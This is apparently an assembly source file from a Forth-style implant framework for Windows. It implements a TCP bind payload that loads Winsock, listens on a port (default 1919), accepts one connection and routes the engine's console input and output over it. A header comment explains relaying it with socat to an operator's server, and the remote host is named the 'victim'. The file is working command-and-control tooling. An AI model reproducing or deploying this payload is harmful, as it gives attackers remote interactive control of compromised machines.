;;; 
;;; A TCP bind transport, which receives a connection from a
;;; connector that will jack it into the server console.
;;;
;;; Connect it something like this:
;;;
;;; (0) Run server at a convenient location
;;; (1) Run bind payload (will bind to configured port)
;;; (2) Run socat to connect the two services together:
;;;
;;;     socat TCP:<victim>:<port> TCP:<server>:<port>
;;; 

%ifndef CONNECTWAIT
	%define CONNECTWAIT 1000
%endif

%ifndef IPADDR
	%define IPADDR 0,0,0,0
%endif

%ifndef PORT
	%define PORT 1919
%endif

start_def ASM, engine, "engine"
	pushthing 2		; 2 is the network engine
end_def engine	

start_def ASM, initio, "initio"	
	mov rbp, rsp
	and rsp, -16 		; align stack
	sub rsp, SHADOW
	
	call .b
.a:     db "ws2_32.dll", 0
.a1:	db "WSAStartup", 0
.a2:	db "socket", 0
.a3:	db "bind", 0
.a4:	db "send", 0
.a5:	db "recv", 0
.a6:	db "ioctlsocket", 0
.a7: 	db "accept", 0	
.a8:	db "closesocket", 0
.a9:  	db "listen", 0
.b:     pop rbx
	lea rcx, [rbx]
	call W32_LoadLibraryA
	AddGlobal G_WINSOCK, rax

	mov rsi, W32_GetProcAddress
	mov rdi, rax
	GetProcAddress  code_initio.a1 - code_initio.a, G_WSASTARTUP
	GetProcAddress  code_initio.a2 - code_initio.a, G_WSOCKET
	GetProcAddress  code_initio.a3 - code_initio.a, G_WBIND
	GetProcAddress  code_initio.a4 - code_initio.a, G_WSEND
	GetProcAddress  code_initio.a5 - code_initio.a, G_WRECV
	GetProcAddress  code_initio.a6 - code_initio.a, G_IOCTL
	GetProcAddress  code_initio.a7 - code_initio.a, G_WACCEPT
	GetProcAddress  code_initio.a8 - code_initio.a, G_WCLOSESOCKET
	GetProcAddress  code_initio.a9 - code_initio.a, G_WLISTEN
	
	;; initialize networking
	mov ecx, 0x0202
	mov rdx, G_HERE
	call G_WSASTARTUP

	;; create socket
	mov ecx, 2
	mov edx, 1
	mov r8, 6
	call G_WSOCKET
	AddGlobal G_SOCK, rax

	;; create address record, connect to port
	mov rcx, G_SOCK
	mov r8, 16
	lea rdx, [ rel $ + 9 ]
	jmp .conn
	db 2, 0,		; AF_INET
	db (PORT >> 8)          ; port, high byte
	db (PORT & 0xff)	; port, low byte
	db IPADDR		; target IP address
	dq 0			; padding
.conn:  call G_WBIND		; connect to port

	;; listen
	mov rcx, G_SOCK
	mov rdx, 1
	call G_WLISTEN
	
	;; accept one connection
	xor rdx, rdx
	mov r8, rdx
	mov rcx, G_SOCK
	call G_WACCEPT
	
	;; save the client socket
	push rax
	sub rsp, SHADOW

	;; close bound socket
	mov rcx, G_SOCK
	call G_WCLOSESOCKET
	add rsp, SHADOW
	pop rax
	mov G_SOCK, rax

	mov rsp, rbp
end_def initio

start_def ASM, c2sock, "c2sock"
	pushthing G_SOCK
end_def c2sock
	
start_def ASM, echooff, "-echo"	
end_def echooff

start_def ASM, echoon, "+echo"	
end_def echoon

start_def ASM, setecho, "!echo"	
	popthing QWORD G_ECHO
end_def setecho	

start_def ASM, emit, "emit"
	push rcx
	push rdi
	mov rcx, G_SOCK
	mov rdx, rsp
	xor r8, r8
	inc r8
	xor r9, r9
	sub rsp, SHADOW
	call G_WSEND
	add rsp, 0x28
	mov rdi, [PSP]
	add PSP, 8
	pop rcx
end_def emit

start_def ASM, key, "key"
	sub PSP, 8
	mov [PSP], rdi
	push rdi
	mov rcx, G_SOCK
	mov rdx, rsp
	xor r8, r8
	inc r8
	xor r9, r9
	sub rsp, SHADOW
	call G_WRECV
	add rsp, SHADOW
	pop rdi
	and rdi, 0xff

	cmp dil, 0x0a
	jne .notnl
	inc QWORD G_LINENO
	
.notnl:	cmp BYTE G_ECHO, BYTE 0
	jz .skip
	
	cmp TOS, 0x0a
	jne .skip
	call code_prompt
	jmp .skip
.skip:  
end_def key	

start_def ASM, keyq, "key?"
	push rcx
	push rdx
	mov rbp, rsp
	sub rsp, 0x28
	
	mov rcx, G_SOCK
	mov rdx, 1074030207
	lea r8, [rsp + 0x20]
	call G_IOCTL
	pushthing 1
	mov edi, [rsp + 0x20]
	
	mov rsp, rbp
	pop rdx
	pop rcx
end_def keyq
	
start_def ASM, type, "type"	
	push rcx
	mov rcx, G_SOCK
	mov rdx, [PSP]
	mov r8, rdi
	xor r9, r9
	sub rsp, SHADOW
	call G_WSEND
	add rsp, SHADOW
	mov rdi, [PSP+8]
	add PSP, 16
	pop rcx
end_def type	
